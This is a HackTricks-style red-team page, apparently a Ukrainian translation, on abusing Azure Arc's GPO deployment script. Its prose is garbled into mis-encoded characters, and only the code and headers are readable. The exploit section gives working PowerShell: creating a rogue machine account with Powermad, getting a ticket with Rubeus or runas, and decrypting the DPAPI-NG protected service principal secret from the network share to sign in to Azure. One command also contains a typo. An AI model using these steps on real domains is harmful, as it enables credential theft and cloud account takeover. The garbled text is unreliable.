# Az - Arc –≤—Ä–∞–∑–ª–∏–≤–∏–π GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º

Azure Arc –¥–æ–∑–≤–æ–ª—è—î —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—é –Ω–æ–≤–∏—Ö –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —Å–µ—Ä–≤–µ—Ä—ñ–≤ (–ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö –¥–æ –¥–æ–º–µ–Ω—É) –≤ Azure Arc –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–µ—Ç–æ–¥—É –æ–±'—î–∫—Ç–∞ –≥—Ä—É–ø–æ–≤–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏. –î–ª—è —Ü—å–æ–≥–æ Microsoft –Ω–∞–¥–∞—î –Ω–∞–±—ñ—Ä —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –¥–ª—è —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–ª—è —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è –ø—Ä–æ—Ü–µ–¥—É—Ä–∏ –ø—Ä–∏—î–¥–Ω–∞–Ω–Ω—è. –£ —Ñ–∞–π–ª—ñ ArcEnableServerGroupPolicy.zip –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç–∞–∫—ñ —Å–∫—Ä–∏–ø—Ç–∏: DeployGPO.ps1, EnableAzureArc.ps1 —Ç–∞ AzureArcDeployment.psm1.

–ü—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ —Å–∫—Ä–∏–ø—Ç DeployGPO.ps1 –≤–∏–∫–æ–Ω—É—î —Ç–∞–∫—ñ –¥—ñ—ó:

1. –°—Ç–≤–æ—Ä—é—î GPO –¥–ª—è –ø—Ä–∏—î–¥–Ω–∞–Ω–Ω—è —Å–µ—Ä–≤–µ—Ä—ñ–≤ Azure Arc —É –ª–æ–∫–∞–ª—å–Ω–æ–º—É –¥–æ–º–µ–Ω—ñ.
2. –ö–æ–ø—ñ—é—î —Å–∫—Ä–∏–ø—Ç –ø—Ä–∏—î–¥–Ω–∞–Ω–Ω—è EnableAzureArc.ps1 –Ω–∞ –≤–∫–∞–∑–∞–Ω—É –º–µ—Ä–µ–∂–µ–≤—É –ø–∞–ø–∫—É, —Å—Ç–≤–æ—Ä–µ–Ω—É –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –ø—Ä–∏—î–¥–Ω–∞–Ω–Ω—è, —è–∫–∞ —Ç–∞–∫–æ–∂ –º—ñ—Å—Ç–∏—Ç—å –ø–∞–∫–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–Ω–∏–∫–∞ Windows.

–ü—Ä–∏ –∑–∞–ø—É—Å–∫—É —Ü—å–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º —Å–∏—Å—Ç–µ–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥–∞—Ç–∏ –¥–≤–∞ –æ—Å–Ω–æ–≤–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏: **ServicePrincipalId** —Ç–∞ **ServicePrincipalClientSecret**. –ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—Ç—Ä—ñ–±–Ω—ñ —ñ–Ω—à—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏, —Ç–∞–∫—ñ —è–∫ –¥–æ–º–µ–Ω, FQDN —Å–µ—Ä–≤–µ—Ä–∞, —â–æ —Ö–æ—Å—Ç–∏—Ç—å —Å–ø—ñ–ª—å–Ω–∏–π –¥–æ—Å—Ç—É–ø, —Ç–∞ —ñ–º'—è —Å–ø—ñ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–µ—Ç–∞–ª—ñ, —Ç–∞–∫—ñ —è–∫ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ—Ä–µ–Ω–¥–∞—Ä—è, –≥—Ä—É–ø–∞ —Ä–µ—Å—É—Ä—Å—ñ–≤ —Ç–∞ —ñ–Ω—à–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è —Ç–∞–∫–æ–∂ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –Ω–∞–¥–∞–Ω—ñ —Å–∫—Ä–∏–ø—Ç—É.

–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Å–µ–∫—Ä–µ—Ç –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ AzureArcDeploy –Ω–∞ –≤–∫–∞–∑–∞–Ω–æ–º—É —Å–ø—ñ–ª—å–Ω–æ–º—É –¥–æ—Å—Ç—É–ø—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è DPAPI-NG. –ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Å–µ–∫—Ä–µ—Ç –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è —É —Ñ–∞–π–ª—ñ –∑ –Ω–∞–∑–≤–æ—é encryptedServicePrincipalSecret. –î–æ–∫–∞–∑–∏ —Ü—å–æ–≥–æ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —É —Å–∫—Ä–∏–ø—Ç—ñ DeployGPO.ps1, –¥–µ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤–∏–∫–ª–∏–∫—É ProtectBase64 –∑ $descriptor —Ç–∞ $ServicePrincipalSecret —è–∫ –≤—Ö—ñ–¥–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏. –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ SID –≥—Ä—É–ø –∫–æ–º–ø'—é—Ç–µ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É —Ç–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ ServicePrincipalSecret –º–æ–∂–µ –±—É—Ç–∏ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ –ª–∏—à–µ –≥—Ä—É–ø–∞–º–∏ –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É —Ç–∞ –∫–æ–º–ø'—é—Ç–µ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É, —è–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ –∫–æ–º–µ–Ω—Ç–∞—Ä—è—Ö –¥–æ —Å–∫—Ä–∏–ø—Ç—É.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

–ú–∏ –º–∞—î–º–æ –Ω–∞—Å—Ç—É–ø–Ω—ñ —É–º–æ–≤–∏:

1. –ú–∏ —É—Å–ø—ñ—à–Ω–æ –ø—Ä–æ–Ω–∏–∫–ª–∏ –≤ –≤–Ω—É—Ç—Ä—ñ—à–Ω—é –º–µ—Ä–µ–∂—É.
2. –£ –Ω–∞—Å —î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∞–±–æ –≤–∑—è—Ç–∏ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –≤ Active Directory.
3. –ú–∏ –≤–∏—è–≤–∏–ª–∏ –º–µ—Ä–µ–∂–µ–≤–∏–π —Ä–µ—Å—É—Ä—Å, —â–æ –º—ñ—Å—Ç–∏—Ç—å –∫–∞—Ç–∞–ª–æ–≥ AzureArcDeploy.

–Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –º–∞—à–∏–Ω–∏ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ AD. –û–¥–∏–Ω –∑ –Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à–∏—Ö - —Ü–µ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –∫–≤–æ—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –º–∞—à–∏–Ω. –Ü–Ω—à–∏–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—é –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –º–∞—à–∏–Ω–∏ —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ ACL –∞–±–æ —Ä—ñ–∑–Ω—ñ —ñ–Ω—à—ñ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
–Ø–∫—â–æ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –º–∞—à–∏–Ω–∏ –æ—Ç—Ä–∏–º–∞–Ω–æ, –º–æ–∂–Ω–∞ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å. –ú–∏ –º–æ–∂–µ–º–æ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É runas.exe –∑ –ø—Ä–∞–ø–æ—Ä–æ–º netonly, –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ pass-the-ticket –∑ Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
–ú–∞—é—á–∏ TGT –¥–ª—è –Ω–∞—à–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ–º–ø'—é—Ç–µ—Ä–∞, –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—É —Å–ª—É–∂–±–æ–≤–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ, –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

–ù–∞ —Ü—å–æ–º—É –µ—Ç–∞–ø—ñ –º–∏ –º–æ–∂–µ–º–æ –∑—ñ–±—Ä–∞—Ç–∏ –∑–∞–ª–∏—à–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ Azure –∑ —Ñ–∞–π–ª—É ArcInfo.json, —è–∫–∏–π –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –Ω–∞ —Ç–æ–º—É –∂ –º–µ—Ä–µ–∂–µ–≤–æ–º—É –∑–∞–≥–∞–ª—å–Ω–æ–º—É –¥–æ—Å—Ç—É–ø—ñ, —â–æ –π —Ñ–∞–π–ª encryptedServicePrincipalSecret. –¶–µ–π —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å —Ç–∞–∫—ñ –¥–µ—Ç–∞–ª—ñ, —è–∫: TenantId, servicePrincipalClientId, ResourceGroup —Ç–∞ —ñ–Ω—à–µ. –ó —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Azure CLI –¥–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —è–∫ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —Å–µ—Ä–≤—ñ—Å–Ω–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª.

## References

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
